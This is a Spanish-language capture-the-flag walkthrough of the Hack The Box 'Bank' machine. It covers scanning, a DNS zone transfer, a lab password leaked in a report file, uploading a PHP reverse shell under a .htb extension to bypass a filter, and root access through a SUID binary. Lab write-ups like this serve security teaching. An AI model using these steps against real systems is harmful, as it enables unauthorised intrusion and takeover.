# Bank ![Avatar](https://www.hackthebox.eu/storage/avatars/f02481d8d8020005f8d66115b3bfae11_thumb.png)

### Initial Scan

```
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumeration

#### DNS

La máquina tiene un servidor DNS en marcha, hagamos una consulta de zone transfer sobre bank.htb
```
dig axfr bank.htb @10.10.10.29

; <<>> DiG 9.16.1-Ubuntu <<>> axfr bank.htb @10.10.10.29
;; global options: +cmd
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
bank.htb.		604800	IN	NS	ns.bank.htb.
bank.htb.		604800	IN	A	10.10.10.29
ns.bank.htb.		604800	IN	A	10.10.10.29
www.bank.htb.		604800	IN	CNAME	bank.htb.
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800
;; Query time: 52 msec
;; SERVER: 10.10.10.29#53(10.10.10.29)
;; WHEN: sáb ago 01 13:13:47 CEST 2020
;; XFR size: 6 records (messages 1, bytes 171)
```

#### HTTP

Tenemos varias URL que añadir a /etc/hosts gracias al DNS, tambien es buena idea ir abriendo burpsuite y añadir ambas al target scope
```
chris.bank.htb
bank.htb
```
El dominio bank.htb nos redirige a bank.htb/login.php vamos a enumerar directorios 
```
/assets (Status: 301)
/inc (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
/balance-transfer (Status: 301)  
```
Dentro de uploads no podemos mirar pero dentro de inc si y tenemos varios archivos .php pero nada que podamos ver, vayamos a /balance-transfer y veremos muchos reportes de un servicio de encriptacion con el siguiente formato:
```
++OK ENCRYPT SUCCESS
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: czeCv3jWYYljNI2mTedDWxNCF37ddRuqrJ2WNlTLje47X7tRlHvifiVUm27AUC0ll2i9ocUIqZPo6jfs0KLf3H9qJh0ET00f3josvjaWiZkpjARjkDyokIO3ZOITPI9T
Email: 1xlwRvs9vMzOmq8H3G5npUroI9iySrrTZNpQiS0OFzD20LK4rPsRJTfs3y1VZsPYffOy7PnMo0PoLzsdpU49OkCSSDOR6DPmSEUZtiMSiCg3bJgAElKsFmlxZ9p5MfrE
Password: TmEnErfX3w0fghQUCAniWIQWRf1DutioQWMvo2srytHOKxJn76G4Ow0GM2jgvCFmzrRXtkp2N6RyDAWLGCPv9PbVRvbn7RKGjBENW3PJaHiOhezYRpt0fEV797uhZfXi
CreditCards: 5
Transactions: 93
Balance: 905948 .
===UserAccount===
```
Todos con una peso aproximado de 580 excepto uno que pesa la mitad que el resto, accedamos a el

```
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```
Parece que alguien no verifico que la encriptacion funcionara , accedamos usando estas creds, una vez dentro tenenmos acceso a un menu para ver las transas y a un formulario para mandar tickets al soporte, pero en el fuente de la página del soporte hay algo sospechoso

### Exploit
```html
<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
```
Con esto podremos subir una revshell php cambiando la extensión por la de .htb y evitar cualquier filtro, solo es cuestion de adjuntarla al ticket y mirar nuestro ticket y ya tenemos shell

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ wc -c /home/chris/user.txt
33 /home/chris/user.txt
```

### Privesc

Consigamos una shell funcional antes que nada
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
Tras esto busquemos programas con SUID
```
www-data@bank:/$ find / -type f -user root -perm -4000 2> /dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```
El primer resultado es cuanto menos peculiar, ejecutemoslo y veamos que ocurre

```
www-data@bank:/$ /var/htb/bin/emergency
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```
Tenemos shell como root, ya solo queda coger la flag 
```
# wc -c /root/root.txt
33 /root/root.txt
```
